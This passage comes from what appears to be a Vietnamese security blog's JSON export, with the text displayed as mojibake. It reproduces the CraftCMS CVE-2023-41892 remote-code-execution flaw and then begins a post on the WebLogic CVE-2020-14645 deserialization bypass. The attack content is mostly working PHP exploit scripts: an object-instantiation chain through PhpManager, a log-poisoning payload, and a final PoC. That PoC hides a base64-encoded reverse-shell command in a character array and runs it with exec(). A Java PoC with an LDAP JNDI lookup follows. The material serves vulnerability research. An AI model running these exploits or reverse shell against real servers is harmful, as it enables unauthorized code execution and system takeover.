báº¡n sáº½ tháº¥y hai giÃ¡ trá»‹ $name vÃ  $value Ä‘Æ°á»£c chÃºng ta truyá»n vÃ o Tá»›i Ä‘Ã¢y, chÃºng ta Ä‘Ã£ cÃ³ kháº£ nÄƒng táº¡o má»™t object báº¥t kÃ¬ mÃ  chÃºng ta muá»‘n báº±ng requets nhÆ° sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 \u0026lt;?php function triggerCode($url, $postData, $proxy = \u0026#39;127.0.0.1:8080\u0026#39;) { // Initialize cURL session $ch = curl_init($url); $options = [ CURLOPT_POST =\u0026gt; true, CURLOPT_POSTFIELDS =\u0026gt; http_build_query($postData), // Encode the POST data CURLOPT_RETURNTRANSFER =\u0026gt; true, CURLOPT_PROXY =\u0026gt; $proxy, // Specify the proxy address and port ]; curl_setopt_array($ch, $options); // Execute the cURL session and store the response $response = curl_exec($ch); // Check for cURL errors if (curl_errno($ch)) { echo \u0026#39;cURL error: \u0026#39; . curl_error($ch); } else { // Output the response from the server echo \u0026#39;Response: \u0026#39; . $response; } // Close the cURL session curl_close($ch); } // Usage for triggerCode $url = \u0026#39;http://192.168.159.149/my-craftcms/web/admin\u0026#39;; $postData = [ \u0026#39;action\u0026#39; =\u0026gt; \u0026#39;conditions/render\u0026#39;, \u0026#39;config\u0026#39; =\u0026gt; json_encode([ \u0026#34;name\u0026#34; =\u0026gt; \u0026#34;conditionClass\u0026#34;, \u0026#34;as Class\u0026#34; =\u0026gt; \u0026#34;xxxxx\u0026#34; ]), \u0026#39;conditionClass\u0026#39; =\u0026gt; [ \u0026#39;class\u0026#39; =\u0026gt; \u0026#39;craft\\elements\\conditions\\ElementCondition\u0026#39; ] ]; triggerCode($url, $postData); ?\u0026gt; vá»›i xxxxx lÃ  Ä‘á»‹a chá»‰ class mÃ  báº¡n muá»‘n táº¡o\nVáº­y lÃ  chÃºng ta Ä‘Ã£ tÃ¬m Ä‘Æ°á»£c con Ä‘Æ°á»ng tá»« source tá»›i sink rá»“i. Pháº§n cÃ²n láº¡i lÃ  Ä‘i tÃ¬m gadget chain thÃ´i\n3.3 From Chain read/execute file to RCE 3.3.1 read/execute file with \\yii\\rbac\\PHPManager Chain nÃ y náº±m á»Ÿ class \\yii\\rbac\\PhpManager. CÃ³ thá»ƒ táº¡i Ä‘Ã¢y nhiá»u báº¡n tháº¯c máº¯c táº¡i sao cÃ³ thá»ƒ tÃ¬m ra class nÃ y. TÃ´i chá»‰ Ä‘Æ¡n giáº£n lÃ  search thÃ´i, search cÃ¡c lÃ m liÃªn quan tá»›i read file, load file, execute rá»“i trace ngÆ°á»£c xem nÃ³ Ä‘Æ°á»£c gá»i tá»« class nÃ o. NgoÃ i ra trong blog trÆ°á»›c Ä‘Ã¢y cá»§a tÃ´i cÅ©ng cÃ³ Ä‘á» cáº­p tá»›i cÃ´ng cá»¥ PHPGCC, báº¡n cÃ³ thá»ƒ sá»­ dá»¥ng thá»­ Äá»ƒ hiá»ƒu rÃµ hÆ¡n vá» chain nÃ y, chÃºng ta cÃ¹ng Ä‘i tháº³ng vÃ o mÃ£ khai thÃ¡c luÃ´n: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 \u0026lt;?php function triggerCode($url, $postData, $proxy = \u0026#39;127.0.0.1:8080\u0026#39;) { // Initialize cURL session $ch = curl_init($url); $options = [ CURLOPT_POST =\u0026gt; true, CURLOPT_POSTFIELDS =\u0026gt; http_build_query($postData), // Encode the POST data CURLOPT_RETURNTRANSFER =\u0026gt; true, CURLOPT_PROXY =\u0026gt; $proxy, // Specify the proxy address and port ]; curl_setopt_array($ch, $options); // Execute the cURL session and store the response $response = curl_exec($ch); // Check for cURL errors if (curl_errno($ch)) { echo \u0026#39;cURL error: \u0026#39; . curl_error($ch); } else { // Output the response from the server echo \u0026#39;Response: \u0026#39; . $response; } // Close the cURL session curl_close($ch); } // Usage for triggerCode $url = \u0026#39;http://192.168.159.149/my-craftcms/web/admin\u0026#39;; $postData = [ \u0026#39;action\u0026#39; =\u0026gt; \u0026#39;conditions/render\u0026#39;, \u0026#39;config\u0026#39; =\u0026gt; json_encode([ \u0026#34;name\u0026#34; =\u0026gt; \u0026#34;conditionClass\u0026#34;, \u0026#34;as Class\u0026#34; =\u0026gt; [ \u0026#39;class\u0026#39; =\u0026gt; \u0026#34;\\yii\\\\rbac\\PhpManager\u0026#34;, \u0026#34;itemFile\u0026#34; =\u0026gt; \u0026#34;@storage/logs/web-2023-09-29.log\u0026#34; ] ]), \u0026#39;conditionClass\u0026#39; =\u0026gt; [ \u0026#39;class\u0026#39; =\u0026gt; \u0026#39;craft\\elements\\conditions\\ElementCondition\u0026#39; ] ]; triggerCode($url, $postData); ?\u0026gt; Trong pháº§n trÆ°á»›c, chÃºng ta cÃ³ thá»ƒ truyá»n giÃ¡ trá»‹ báº¥t kÃ¬ vÃ o hÃ m Yii:createObject($value). HÃ m Yii:createObject() cÅ©ng cho phÃ©p chÃºng tra truyá»n nhiá»u kiá»ƒu dá»¯ liá»‡u (string, array,callable)\nVá»›i flow khai thÃ¡c trÆ°á»›c Ä‘Ã³, chÃºng ta luÃ´n gá»i Yii:createObject($value) cÃ³ nghÄ©a lÃ  $params luÃ´n báº±ng null. May máº¯n thay, khi truyá»n vÃ o $value dÆ°á»›i dáº¡ng array, chÃºng ta cÃ³ thá»ƒ thay Ä‘á»•i, thiáº¿t láº­p giÃ¡ trá»‹ cÃ¡c properties cá»§a object (cá»› cháº¿ giá»‘ng nhÆ° gá»i hÃ m Craft:configure). Cá»¥ thá»ƒ, tÃ´i cÃ³ request nhÆ° sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 \u0026lt;?php function triggerCode($url, $postData, $proxy = \u0026#39;127.0.0.1:8080\u0026#39;) { // Initialize cURL session $ch = curl_init($url); $options = [ CURLOPT_POST =\u0026gt; true, CURLOPT_POSTFIELDS =\u0026gt; http_build_query($postData), // Encode the POST data CURLOPT_RETURNTRANSFER =\u0026gt; true, CURLOPT_PROXY =\u0026gt; $proxy, // Specify the proxy address and port ]; curl_setopt_array($ch, $options); // Execute the cURL session and store the response $response = curl_exec($ch); // Check for cURL errors if (curl_errno($ch)) { echo \u0026#39;cURL error: \u0026#39; . curl_error($ch); } else { // Output the response from the server echo \u0026#39;Response: \u0026#39; . $response; } // Close the cURL session curl_close($ch); } // Usage for triggerCode $url = \u0026#39;http://192.168.159.149/my-craftcms/web/admin\u0026#39;; $postData = [ \u0026#39;action\u0026#39; =\u0026gt; \u0026#39;conditions/render\u0026#39;, \u0026#39;config\u0026#39; =\u0026gt; json_encode([ \u0026#34;name\u0026#34; =\u0026gt; \u0026#34;conditionClass\u0026#34;, \u0026#34;as Class\u0026#34; =\u0026gt; [ \u0026#39;class\u0026#39; =\u0026gt; \u0026#34;\\yii\\\\rbac\\PhpManager\u0026#34;, \u0026#34;itemFile\u0026#34; =\u0026gt; \u0026#34;file_name\u0026#34; ] ]), \u0026#39;conditionClass\u0026#39; =\u0026gt; [ \u0026#39;class\u0026#39; =\u0026gt; \u0026#39;craft\\elements\\conditions\\ElementCondition\u0026#39; ] ]; triggerCode($url, $postData); ?\u0026gt; Vá»›i request trÃªn, chÆ°Æ¡ng trÃ¬nh sáº½ gá»i hÃ m Yii:createObject($value) vá»›i $value lÃ  má»™t array cÃ³ 2 tham sá»‘ nhÆ° hÃ¬nh:\nCÃ¡c bÆ°á»›c tiáº¿p theo debug Ä‘á»ƒ hiá»ƒu rÃµ flow cá»§a hÃ m createObject(), tÃ´i sáº½ lÆ°á»£t bá»›t pháº§n nÃ y Ä‘á»ƒ náº£y tháº³ng tá»›i class \\yii\\rbac\\PhpManager (BÆ°á»›c nÃ y khÃ¡ quan trá»ng cho nhá»¯ng ai muá»‘n tá»± build, custom payload)\nTiáº¿p tá»¥c chÆ°Æ¡ng trÃ¬nh, vÃ¬ Ä‘Æ°á»£c khá»Ÿi táº¡o nÃªn hÃ m __construct() cá»§a \\yii\\rbac\\PhpManager\nCÃ¡ch khai thÃ¡c nÃ y giá»‘ng vá»›i cÃ¡ch khai thÃ¡c PHP deserialize, tÃ¬m cÃ¡c magic method Ä‘á»ƒ control value cÃ¡c properties Ä‘á»ƒ thay Ä‘á»•i luá»“ng thá»±c thi\nHÃ m nÃ y sáº½ gá»i Yii:configure()\nHÃ m nÃ y tÆ°Æ¡ng tá»± vá»›i Craft:configure() sáº½ thiáº¿t láº­p giÃ¡ trá»‹ cÃ¡c properties cho object\nTiáº¿p theo, hÃ m $this-\u0026gt;init() Ä‘Æ°á»£c gá»i. Táº¡i bÆ°á»›c nÃ y, object cá»§a chÃºng ta Ä‘Ã£ cÃ³ property itemFile=\u0026quot;file_name\u0026quot;\nVÃ o hÃ m init():\nCÃ¡c giÃ¡ trá»‹ sáº½ Ä‘Æ°á»£c kiá»ƒm tra xem cÃ³ pháº£i lÃ  alias khÃ´ng, náº¿u pháº£i thÃ¬ sáº½ láº¥y Ä‘á»‹a chá»‰ tá»« alias Ä‘Ã³ (trong CraftCMS, cÃ¡c alias Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ thay cho cÃ¡c Ä‘á»‹a chá»‰ cá»‘ Ä‘á»‹nh nhÆ° lÃ : @web, @storage,...\nSau Ä‘Ã³ hÃ m this-\u0026gt;load() Ä‘Æ°á»£c gá»i, hÃ m nÃ y sáº½ Ä‘á»c ná»™i dung tá»« Ä‘á»‹a chá»‰ file Ä‘Æ°á»£c truyá»n vÃ o\nÄáº¿n Ä‘Ã¢y thÃ¬ cháº¯c háº³n báº¡n Ä‘Ã£ hiá»ƒu trong mÃ£ khai thÃ¡c, táº¡i sao tÃ´i biáº¿t vÃ  truyá»n property itemFile vÃ o rá»“i Ä‘Ãºng khÃ´ng? LÃ  debug tháº¥y Ä‘Ã³.\nNhÆ° váº­y, tá»›i Ä‘Ã¢y, tÃ´i Ä‘Ã£ cÃ³ thá»ƒ Ä‘á»c Ä‘Æ°á»£c má»™t file báº¥t kÃ¬ trÃªn há»‡ thá»‘ng náº¿u biáº¿t Ä‘á»‹a chá»‰ cá»§a nÃ³. TÃ´i thá»­ táº¡o má»™t file Edisc.php vá»›i ná»™i dung lÃ \n1 2 3 \u0026lt;?php print_r(phpinfo()); ?\u0026gt; CÃ¹ng xem thá»­ chain nÃ y chá»‰ Ä‘Æ¡n giáº£n lÃ  Ä‘á»c lÃªn thÃ´i hay thá»±c thi code ná»¯a.\nWow! Tháº­t báº¥t ngá», nÃ³ thá»±c thi code ná»¯a. Thá»«a tháº¯ng xong lÃªn kiáº¿m RCE thÃ´i!!! ğŸ˜ŠğŸ˜ŠğŸ˜ŠğŸ˜Š\n3.3.2 RCE with log file Sau khi tÃ¬m Ä‘Æ°á»£c chain read/execute file báº¥t kÃ¬, cÃ¢u há»i tiáº¿p theo Ä‘áº·c ra lÃ : nÃªn read file nÃ o? TÃ´i báº¯t Ä‘áº§u chÃº Ã½ tá»›i folder /opt/lampp/htdocs/my-craftcms/storage/logs : NÆ¡i Ä‘Ã¢y log láº¡i cÃ¡c request tá»›i server\nTÃªn gá»i theo format dá»… Ä‘oÃ¡n:\nTrong Ä‘Ã³ web-yyy-mm-dd.log lÆ°u láº¡i cÃ¡c request truyá»n tá»›i, ká»ƒ cáº£ Ä‘Ã³ lÃ  authen hay unauthen\nÄá»‹a chá»‰ nÃ y cÃ³ alias lÃ  @storage\nNhÆ° váº­y, vá»›i Ä‘á»‹a chá»‰ file lÃ  @storage/logs/web-2023-09-29.log, tÃ´i cÃ³ thá»ƒ Ä‘á»c Ä‘Æ°á»£c log file. Tuy nhiÃªn, cÃ¢u chuyá»‡n lÃ  lÃ m sao Ä‘á»ƒ cÃ³ thá»ƒ RCE. Thá»© nháº¥t log file cÃ³ Ä‘á»‹nh dáº¡ng lÃ  file.log, liá»‡u cÃ³ thá»±c thi Ä‘Æ°á»£c code khÃ´ng? TÃ´i thá»­ ngay, viáº¿t vÃ o file log Ä‘oáº¡n code \u0026lt;?php print_r(phpinfo());?\u0026gt; rá»“i xem káº¿t quáº£. VÃ  káº¿t quáº£ khÃ´ng thá»ƒ lÃ m cho chÃºng ta má»«ng hÆ¡n ^^ Thá»±c thi Ä‘Æ°á»£c. BÆ°á»›c tiáº¿p theo, tÃ´i cÃ¹ng xem xÃ©t format cá»§a log Ä‘á»ƒ xem thá»­ mÃ¬nh cÃ³ thá»ƒ break vÃ  chÃ¨n code vÃ o Ä‘Æ°á»£c hay khÃ´ng. TÃ´i xÃ³a háº¿t log Ä‘i vÃ  thá»­ requets Ä‘Æ¡n giáº£n trÆ°á»›c: 1 2 3 4 5 6 7 8 POST /my-craftcms/web/admin HTTP/1.1 Host: 192.168.159.149 Accept: */* Content-Length: 511 Content-Type: application/x-www-form-urlencoded Connection: close xxxx=xxx Sau má»™t há»“i thá»­, tÃ´i phÃ¡t hiá»‡n chÃºng ta cÃ³ thá»ƒ break báº±ng request nhÆ° sau: xxxx=']\u0026lt;?php print_r(phpinfo())?\u0026gt;'[ Thá»­ Ä‘á»c láº¡i file xem sao: Ngon lÃ nh, thá»«a tháº¯ng xÃ´ng lÃªn thÃ´i!!!\nSearch ngay trÃªn máº¡ng 1 payload revershell rá»“i thá»±c thi ngay thÃ´i. NhÆ° váº­y lÃ  xongâ€¦\nNhÆ°ng Ä‘á»i khÃ´ng nhÆ° mÆ¡ Ä‘Ã¢uâ€¦ VÃ¬ khi ghi log, thÃ¬ dáº¥u ' vÃ  \u0026quot; sáº½ bá»‹ lÆ°u thÃ nh \\' vÃ  \\\u0026quot; nÃªn mÃ£ khai thÃ¡c cá»§a chÃºng ta khÃ´ng cháº¡y. ChÃºng ta cáº§n brainstorm lÃ m sao Ä‘á»ƒ build 1 cÃ¡i mÃ£ mÃ  khÃ´ng cÃ³ 2 dáº¥u trÃªn VÃ  Ä‘Ã¢y lÃ  POC cuá»‘i cÃ¹ng cá»§a tÃ´i.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 \u0026lt;?php function sendRequest($url, $cookie, $data) { $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_HEADER, true); curl_setopt($ch, CURLOPT_COOKIE, $cookie); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $data); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // This is equivalent to -k option in cURL curl_setopt($ch, CURLOPT_HTTPHEADER, [ \u0026#39;Host: 192.168.159.149\u0026#39;, \u0026#39;Accept: */*\u0026#39;, \u0026#39;Upgrade-Insecure-Requests: 1\u0026#39;, \u0026#39;Connection: close\u0026#39;, \u0026#39;Content-Length: \u0026#39; . strlen($data), ]); $response = curl_exec($ch); if ($response === false) { echo \u0026#39;cURL error: \u0026#39; . curl_error($ch); } else { // Output the response including headers echo $response; } curl_close($ch); } // Usage $url = \u0026#39;http://192.168.159.149/my-craftcms/web/admin\u0026#39;; $cookie = \u0026#39;command=xxx\u0026#39;; $data = \u0026lt;\u0026lt;\u0026lt;PHP \u0026#39;]\u0026lt;?php ?\u0026gt; ;\u0026lt;?php ;php \\$array = [76, 50, 74, 112, 98, 105, 57, 105, 89, 88, 78, 111, 73, 67, 49, 106, 73, 67, 99, 118, 89, 109, 108, 117, 76, 50, 74, 104, 99, 50, 103, 103, 76, 87, 107, 103, 80, 105, 89, 103, 76, 50, 82, 108, 100, 105, 57, 48, 89, 51, 65, 118, 77, 84, 107, 121, 76, 106, 69, 50, 79, 67, 52, 52, 77, 67, 52, 120, 76, 122, 107, 119, 77, 68, 69, 103, 77, 68, 52, 109, 77, 83, 99, 61]; \u0026lt;?php \\$array = [76, 50, 74, 112, 98, 105, 57, 105, 89, 88, 78, 111, 73, 67, 49, 106, 73, 67, 99, 118, 89, 109, 108, 117, 76, 50, 74, 104, 99, 50, 103, 103, 76, 87, 107, 103, 80, 105, 89, 103, 76, 50, 82, 108, 100, 105, 57, 48, 89, 51, 65, 118, 77, 84, 107, 121, 76, 106, 69, 50, 79, 67, 52, 52, 77, 67, 52, 120, 76, 122, 107, 119, 77, 68, 69, 103, 77, 68, 52, 109, 77, 83, 99, 61]; \\$string = array_reduce(\\$array, function (\\$a, \\$b) { return \\$a . chr(\\$b); }); print_r(base64_decode(\\$string)); exec(base64_decode(\\$string)); ?\u0026gt;\u0026#39; PHP; sendRequest($url, $cookie, $data); function triggerCode($url, $postData, $proxy = \u0026#39;127.0.0.1:8080\u0026#39;) { // Initialize cURL session $ch = curl_init($url); $options = [ CURLOPT_POST =\u0026gt; true, CURLOPT_POSTFIELDS =\u0026gt; http_build_query($postData), // Encode the POST data CURLOPT_RETURNTRANSFER =\u0026gt; true, CURLOPT_PROXY =\u0026gt; $proxy, // Specify the proxy address and port ]; curl_setopt_array($ch, $options); // Execute the cURL session and store the response $response = curl_exec($ch); // Check for cURL errors if (curl_errno($ch)) { echo \u0026#39;cURL error: \u0026#39; . curl_error($ch); } else { // Output the response from the server echo \u0026#39;Response: \u0026#39; . $response; } // Close the cURL session curl_close($ch); } // Usage for triggerCode $url = \u0026#39;http://192.168.159.149/my-craftcms/web/admin\u0026#39;; $postData = [ \u0026#39;action\u0026#39; =\u0026gt; \u0026#39;conditions/render\u0026#39;, \u0026#39;config\u0026#39; =\u0026gt; json_encode([ \u0026#34;name\u0026#34; =\u0026gt; \u0026#34;elementType\u0026#34;, \u0026#34;elementType\u0026#34; =\u0026gt; \u0026#34;\\yii\\\\rbac\\PhpManager\u0026#34;, \u0026#34;as class1\u0026#34; =\u0026gt; [ \u0026#39;class\u0026#39; =\u0026gt; \u0026#34;\\yii\\\\rbac\\PhpManager\u0026#34;, \u0026#34;itemFile\u0026#34; =\u0026gt; \u0026#34;@storage/logs/web-2023-09-29.log\u0026#34; ] ]), \u0026#39;elementType\u0026#39; =\u0026gt; [ \u0026#39;class\u0026#39; =\u0026gt; \u0026#39;craft\\elements\\conditions\\ElementCondition\u0026#39;, \u0026#39;config\u0026#39; =\u0026gt; json_encode([ \u0026#34;elementTypess\u0026#34; =\u0026gt; \u0026#34;\\yii\\\\rbac\\PhpManager\u0026#34;, \u0026#39;conditionRules\u0026#39; =\u0026gt; [\u0026#39;UploaderConditionRule\u0026#39;] ]) ] ]; // Sleep for 2 seconds sleep(2); triggerCode($url, $postData); ?\u0026gt; Má»™t sá»‘ lÆ°u Ã½: Náº¿u cÃ¡c báº¡n bá» qua cÃ¡c bÆ°á»›c trÃªn mÃ  láº¥y POC á»Ÿ trÃªn cháº¡y ngay thÃ¬ nÃ³ sáº½ khÃ´ng work (vÃ  Ä‘Ã¢y cÅ©ng ko pháº£i lÃ  tinh tháº§n cá»§a blog nÃ y) Vá»›i cÃ¡ch khai thÃ¡c nÃ y sáº½ cÃ³ nhiá»u yáº¿u tá»‘ bá»‹ phá»¥ thuá»™c: TÃªn Ä‘á»‹a chá»‰ file log cÃ³ thá»ƒ bá»‹ format láº¡i á»Ÿ realcase, chÃºng ta khÃ´ng Ä‘oÃ¡n Ä‘Æ°á»£c. Cáº¥u trÃºc lÆ°u log, ná»™i dung lÆ°u log Do Ä‘Ã³, chÃºng ta cáº§n tÃ¬m má»™t phÆ°Æ¡ng phÃ¡p khÃ¡c Ä‘á»ƒ khai thÃ¡c hiá»‡u quáº£ hÆ¡n. Äáº¹p nháº¥t lÃ  tÃ¬m má»™t chain cho phÃ©p lÆ°u file tÃ¹y Ã½ Ä‘á»ƒ rá»“i chÃºng ta execute. Yeah, má»™t trong nhá»¯ng Ä‘Ã¡p Ã¡n Ä‘áº¹p Ä‘Ã³ náº±m á»Ÿ bÃ i research nÃ y https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/. CÃ²n Ä‘Ã¡p Ã¡n cá»¥ thá»ƒ nhÆ° tháº¿ nÃ o thÃ¬ chá» á»Ÿ blog sau hoáº·c tÃ´i sáº½ update sau nhÃ©. BÃ¢y giá» tÃ´i pháº£i submit Ä‘á»ƒ ká»‹p deadline blog cá»§a thÃ¡ng nÃ y Ä‘á»ƒ khá»i bá»‹ máº¥t 200k thÃ´i.\nIV. TÃ i liá»‡u tham kháº£o https://blog.calif.io/p/craftcms-rce\nhttps://www.youtube.com/watch?v=j1MrBKIO0FQ\nhttps://craftcms.com/docs/4.x/installation.html\nhttps://www.cloudways.com/blog/php-debug/\nhttps://viblo.asia/p/yii-framework-tim-hieu-cau-truc-va-chay-thu-voi-basic-application-Qbq5QJOJKD8\n","description":"Sau vÃ i thÃ¡ng Ä‘áº¯m chÃ¬m vÃ o Java Deserialize attack vÃ  Ã´n luyá»‡n blackbox, tÃ´i tÃ­ ná»¯a lÃ  bá»‹ cháº¿t chÃ¬m luÃ´n ğŸ˜Ÿ. Äá»£t nÃ y nhÃ¢n tiá»‡n cÃ³ CVE má»›i cá»§a product CraftCMS viáº¿t báº±ng PHP, tÃ´i quyáº¿t Ä‘á»‹nh reproduce Ä‘á»ƒ Ã´n láº¡i PHP vÃ  láº¥y láº¡i mood.","id":1,"section":"posts","tags":["cve, php"],"title":"Reproducing CVE-2023-41892: CraftCMS RCE","uri":"https://minhlongmt183.github.io/posts/cve-2023-41892_craftcms_rce/"},{"content":"I. Lá»i má»Ÿ Ä‘áº§u Tiáº¿p tá»¥c vá»›i series tá»± há»c Java Deserializee cá»§a newbie, trong bÃ i nÃ y tÃ´i trÃ¬nh bÃ y vá» CVE-2020-14645 cá»§a weblogic.\nGiá»›i thiá»‡u sÆ¡ vá» Ä‘á»‘i tÆ°á»£ng phÃ¢n tÃ­ch, CVE-2020-14645 lÃ  bypass cá»§a báº£n vÃ¡ lá»—i CVE-2020-2883. Trong báº£n patch lá»—i CVE-2020-2883 sink MvelExtractor vÃ  ReflectionExtractor bá»‹ blacklisted, do Ä‘Ã³ cáº§n tÃ¬m má»™t extract class khÃ¡c cÃ³ malicious operations trong method.\nVÃ¬ cÃ¡c patch lá»—i CVE-2020-2883 lÃ  Ä‘Æ°a hÃ m sink bá»‹ lá»—i vÃ o blacklist, nÃªn chÃºng ta chá»‰ cáº§n tÃ¬m ra 1 sink khÃ¡c vÃ  sá»­ dá»¥ng chain trÆ°á»›c cá»§a CVE-2020-2883 Ä‘á»ƒ khai thÃ¡c.\nTá»« Ä‘Ã¢y, ta rÃºt ra má»™t nháº­n xÃ©t:\nCÃ¡ch mÃ  weblogic fix cÃ¡c CVE lÃ  Ä‘Æ°a cÃ¡c hÃ m sink vÃ o blacklist.\nVáº­y, Ä‘á»ƒ tÃ¬m ra 1 CVE má»›i chá»‰ â€œÄ‘Æ¡n giáº£nâ€ lÃ  tÃ¬m cÃ¡ch bypass cÃ¡c hÃ m Ä‘Ã£ cÃ³ hoáº·c tÃ¬m ra chain má»›i. NhÆ°ng cÃ¢u chuyá»‡n Ä‘Ã³ váº«n cÃ²n xa vá»›i tÃ´i ğŸ¤­ğŸ¤­ğŸ¤­ğŸ¤­ğŸ¤­ğŸ¤­\nQuay láº¡i vá»›i CVE nÃ y, ta sáº½ xuáº¥t phÃ¡t tá»« CVE-2020-14645. CÃ¹ng nhau phÃ¢n tÃ­ch, má»• xáº» Ä‘á»ƒ lÃ m suy luáº­n ra cÃ¡ch mÃ  tÃ¡c giáº£ tÃ¬m tháº¥y vÃ  hiá»ƒu tÆ°á»ng táº­n lá»— há»•ng nÃ y. (Táº¥t nhiÃªn vÃ¬ CVE nÃ y lÃ  báº£n bypass, nÃªn chÃºng ta cáº§n pháº£i â€œtÃ¬m vá» cá»™i nguá»“nâ€ Ä‘á»ƒ hiá»ƒu rÃµ tÆ°á»ng táº­n).\nII. CVE-2020-14645 2.1 Chuáº©n bá»‹ mÃ´i trÆ°á»ng Yeah, ban Ä‘áº§u, táº¡m cháº¥p nháº­n chÃºng ta cÃ³ mÃ£ khai thÃ¡c POC. BÃ¢y giá» cÃ¹ng phÃ¢n tÃ­ch má»• xáº» nÃ³ nÃ o. Vá»›i Weblogic, chÃºng ta cáº§n pháº£i hiá»ƒu thÃªm vá» giao thá»©c T3, RMI,â€¦ lÃ  nhá»¯ng giao thá»©c há»— trá»£ vá» serialize vÃ  deserialize.\nVá» báº£n cháº¥t thÃ¬ payload serialize sáº½ truyá»n lÃªn webserver, thÃ´ng qua giao thá»©c trÃªn Ä‘á»ƒ deserialize ra. VÃ¬ lÃ­ do kiáº¿n thá»©c chÆ°a Ä‘á»§ kiáº¿n thá»©c vá» cÃ¡c protocol trÃªn nÃªn Ä‘oáº¡n code mÃ  tÃ´i phÃ¢n tÃ­ch chá»‰ dÃ¹ng readObject() Ä‘á»ƒ deserialize. MÃ´i trÆ°á»ng Ä‘á»ƒ tiáº¿n hÃ nh debug nhÆ° sau:\njdk \u0026ldquo;1.8.0_121â€ WebLogic Server Version: 12.2.1.4.0 MÃ£ khai thÃ¡c phÃ¢n tÃ­ch:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 package CVE_2020_14645; import com.sun.rowset.JdbcRowSetImpl ; import com.tangosol.util.ValueExtractor ; import com.tangosol.util.comparator.ExtractorComparator ; import com.tangosol.util.extractor.ChainedExtractor ; import com.tangosol.util.extractor.UniversalExtractor ; import java.io.FileInputStream ; import java.io.FileOutputStream ; import java.io.ObjectInputStream ; import java.io.ObjectOutputStream ; import java.lang.reflect.Field ; import java.sql.SQLException ; import java.util.PriorityQueue ; public class cve_2020_14645 { public static void main(String[] args) throws Exception { // CVE_2020_14645 UniversalExtractor extractor = new UniversalExtractor(\u0026#34;getDatabaseMetaData()\u0026#34;, null, 1); final ExtractorComparator comparator = new ExtractorComparator(extractor); JdbcRowSetImpl rowSet = new JdbcRowSetImpl(); rowSet.setDataSourceName(\u0026#34;ldap://127.0.0.1:8082/glnikw\u0026#34;); final PriorityQueue \u0026lt; Object \u0026gt; queue = new PriorityQueue \u0026lt; Object \u0026gt; (2, comparator); Object[] q = new Object[] { rowSet, rowSet }; Field queue1 = queue.getClass().getDeclaredField(\u0026#34;queue\u0026#34;); queue1.setAccessible(true); queue1.set(queue, q); Field queue2 = queue.getClass().getDeclaredField(\u0026#34;size\u0026#34;); queue2.setAccessible(true); queue2.set(queue, 2); //serial ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;poc.ser\u0026#34;)); objectOutputStream.writeObject(queue); objectOutputStream.close(); //unserial ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(\u0026#34;poc.ser\u0026#34;)); objectInputStream.readObject(); objectInputStream.close(); } } LÆ°u Ã½: VÃ¬ lá»— há»•ng tá»“n táº¡i trong lib cá»§a Weblogic, nÃªn ta cáº§n pháº£i import lib weblogic vÃ o project. Trong trÆ°á»ng há»£p nÃ y, tÃ´i export háº¿t táº¥t cáº£ cÃ¡c lib trong weblogic ra vÃ o import vÃ o project.\nÄáº§u tiÃªn, chÃºng ta cÃ³ má»™t Ä‘á»‘i tÆ°á»£ng UniversalExtractor Ä‘Æ°á»£c khá»Ÿi táº¡o vá»›i cÃ¡c tham sá»‘ lÃ  \u0026quot;getDatabaseMetaData()\u0026quot;, null, vÃ  1. Tiáº¿p theo, chÃºng ta cÃ³ má»™t Ä‘á»‘i tÆ°á»£ng ExtractorComparator Ä‘Æ°á»£c khá»Ÿi táº¡o vá»›i Ä‘á»‘i tÆ°á»£ng extractor. Sau Ä‘Ã³, chÃºng ta táº¡o má»™t Ä‘á»‘i tÆ°á»£ng JdbcRowSetImpl, Ä‘áº·t dataSourceName lÃ  \u0026quot;ldap://127.0.0.1:8082/khch4r\u0026quot;. Tiáº¿p theo, chÃºng ta táº¡o má»™t hÃ ng Ä‘á»£i Æ°u tiÃªn (PriorityQueue) Ä‘Æ°á»£c gá»i lÃ  queue vá»›i sá»‘ lÆ°á»£ng tá»‘i Ä‘a lÃ  2 vÃ  má»™t comparator Ä‘á»ƒ so sÃ¡nh cÃ¡c pháº§n tá»­ trong hÃ ng Ä‘á»£i. Sau Ä‘Ã³, chÃºng ta khá»Ÿi táº¡o má»™t máº£ng Ä‘á»‘i tÆ°á»£ng q chá»©a hai tham chiáº¿u Ä‘áº¿n rowSet, vÃ  thiáº¿t láº­p láº¡i cÃ¡c trÆ°á»ng cá»§a queue thÃ´ng qua reflection Ä‘á»ƒ Ä‘áº·t máº£ng q vÃ o hÃ ng Ä‘á»£i vÃ  Ä‘áº·t láº¡i kÃ­ch thÆ°á»›c cá»§a hÃ ng Ä‘á»£i lÃ  2. Äiá»u nÃ y giÃºp táº¡o ra má»™t tráº¡ng thÃ¡i khÃ´ng há»£p lá»‡ trong queue vÃ  sáº½ gÃ¢y ra lá»—i khi tiáº¿n hÃ nh giáº£i tuáº§n tá»± hÃ³a cÃ¡c pháº§n tá»­ trong hÃ ng Ä‘á»£i sau Ä‘Ã³. Tiáº¿p theo, chÃºng ta tiáº¿n hÃ nh serialize queue 